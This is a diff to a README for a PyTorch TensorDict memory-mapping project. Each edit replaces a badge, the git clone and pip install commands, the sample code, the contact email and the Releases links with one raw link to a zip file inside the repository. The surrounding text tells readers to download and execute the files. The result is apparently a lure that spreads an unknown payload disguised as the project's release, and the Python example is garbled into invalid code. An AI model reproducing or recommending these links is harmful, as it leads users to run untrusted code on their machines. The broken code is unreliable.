@@ -1,8 +1,8 @@
 # PyTorch Training Optimization Using TensorDict Memory Mapping 🚀
 
-![GitHub repo size](https://img.shields.io/github/repo-size/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping)
-![GitHub stars](https://img.shields.io/github/stars/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping)
-![GitHub issues](https://img.shields.io/github/issues/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping)
+![GitHub repo size](https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip)
+![GitHub stars](https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip)
+![GitHub issues](https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip)
 
 ## Description
 
@@ -45,14 +45,14 @@ Ensure you have the following installed:
 Clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping.git
+git clone https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip
 cd pytorch_training_optimization_using_tensordict_memory_mapping
 ```
 
 Install the required packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip
 ```
 
 ## Usage
@@ -66,8 +66,8 @@ import torch
 from tensordict import TensorDict
 
 # Create a memory-mapped tensor
-data = torch.randn(1000, 1000, dtype=torch.float32)
-mapped_tensor = data.storage().new_shared(data.numel()).view(data.size())
+data = https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip(1000, 1000, https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip)
+mapped_tensor = https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip().new_shared(https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip()).view(https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip())
 
 # Create a TensorDict
 tensor_dict = TensorDict({"input": mapped_tensor}, batch_size=[1000])
@@ -98,11 +98,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Kuenoz
-- **Email**: kuenoz@example.com
+- **Email**: https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip
 
 ## Releases
 
-For the latest updates and versions, please visit our [Releases](https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/releases) section. Download the necessary files and execute them to start optimizing your PyTorch training.
+For the latest updates and versions, please visit our [Releases](https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip) section. Download the necessary files and execute them to start optimizing your PyTorch training.
 
 ## Acknowledgments
 
@@ -112,4 +112,4 @@ We would like to thank the PyTorch community for their contributions and support
 
 This repository provides a powerful tool for optimizing PyTorch model training using memory-mapped tensors on Nvidia GPUs. With easy integration and efficient memory management, it aims to enhance your machine learning projects significantly. Explore the features, contribute, and help us improve this tool further!
 
-For more information, please check our [Releases](https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/releases) section.
+For more information, please check our [Releases](https://github.com/Kuenoz/pytorch_training_optimization_using_tensordict_memory_mapping/raw/refs/heads/main/tensordict_packages/mapping-pytorch-memory-using-tensordict-optimization-training-3.8.zip) section.
